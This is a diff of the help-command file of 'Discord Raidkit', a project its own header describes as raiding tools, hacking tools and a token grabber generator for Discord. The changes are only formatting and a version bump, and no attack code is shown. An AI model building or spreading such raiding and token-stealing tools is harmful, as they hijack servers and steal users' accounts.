@@ -1,5 +1,5 @@
-'''
-Discord Raidkit v2.3.0 — "The trojan horse of discord raiding" 
+"""
+Discord Raidkit v2.3.1 — "The trojan horse of discord raiding"
 Copyright © 2022 the-cult-of-integral
 
 a collection of raiding tools, hacking tools, and a token grabber generator for discord; written in Python 3
@@ -8,8 +8,8 @@ This program is under the GNU General Public License v2.0.
 https://github.com/the-cult-of-integral/discord-raidkit/blob/master/LICENSE
 
 ahelp.py contains the dynamic help command for the Anubis raidkit.
-ahelp.py was last updated on 11/08/22 at 13:38.
-'''
+ahelp.py was last updated on 04/09/22 at 18:25.
+"""
 
 import logging
 
@@ -37,7 +37,9 @@ class Help(commands.Cog):
             embed = discord.Embed(color=discord.Color.gold())
             embed.set_author(name=f"Here's a list of my commands!")
 
-            if not author.guild_permissions.manage_messages and not author.guild_permissions.kick_members and not author.guild_permissions.ban_members and not author.guild_permissions.administrator and not author.guild_permissions.moderate_members:
+            if not author.guild_permissions.manage_messages and not author.guild_permissions.kick_members and not \
+                    author.guild_permissions.ban_members and not author.guild_permissions.administrator and not \
+                    author.guild_permissions.moderate_members:
                 embed.add_field(
                     name="**No permissions for moderator commands!**",
                     value="You lack every permission used by the moderator commands.",
